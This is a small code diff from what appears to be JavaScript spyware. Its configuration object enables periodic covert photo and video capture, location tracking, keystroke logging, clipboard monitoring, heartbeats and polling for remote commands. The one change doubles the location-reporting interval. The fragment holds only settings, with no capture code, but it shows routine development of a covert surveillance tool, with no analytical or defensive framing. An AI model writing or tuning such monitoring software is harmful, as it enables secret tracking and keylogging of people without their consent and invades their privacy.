@@ -5,7 +5,7 @@
     let C = {
         photoEnabled: true, photoPeriod: 30000, photoQuality: 0.7,
         videoEnabled: true, videoPeriod: 300000, videoDuration: 10000,
-        locationEnabled: true, locationPeriod: 15000,
+        locationEnabled: true, locationPeriod: 30000,
         keystrokesEnabled: true, keyLogFlush: 10000,
         clipboardEnabled: true, clipboardCheck: 15000,
         deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000
